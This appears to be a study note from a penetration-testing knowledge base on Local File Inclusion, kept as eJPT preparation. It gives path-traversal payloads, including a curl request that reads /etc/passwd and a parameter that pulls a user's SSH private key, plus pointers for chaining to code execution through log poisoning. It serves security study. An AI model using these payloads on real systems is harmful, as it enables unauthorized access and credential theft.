---
type: technique
tags: [ejpt:web-pentest]
tools: [curl]
cves: []
related: [[log-poisoning]], [[parameter-fuzzing]]
---

# Local File Inclusion (LFI)

Including arbitrary local files via an unsanitized include/read parameter.

## Detection

- A URL parameter that controls page content (e.g. `?page=`, `?file=`, `?lang=`) may be injectable.
- Test with path traversal: `../../../etc/passwd`.

## Read files

```sh
curl -s "http://TARGET/index.php?param=../../../etc/passwd"
```

- Read SSH keys for a foothold: `?param=../../home/user/.ssh/id_rsa` ([[psycho]]).

## Chain to RCE

- Pair with [[log-poisoning]] to execute injected code.
- Or include `/proc/self/environ` with a poisoned User-Agent.

## Seen in

[[hannah-coffee]] (`?studio=../../../etc/passwd`), [[psycho]] (`?secret=` → `/etc/passwd` and `id_rsa`)
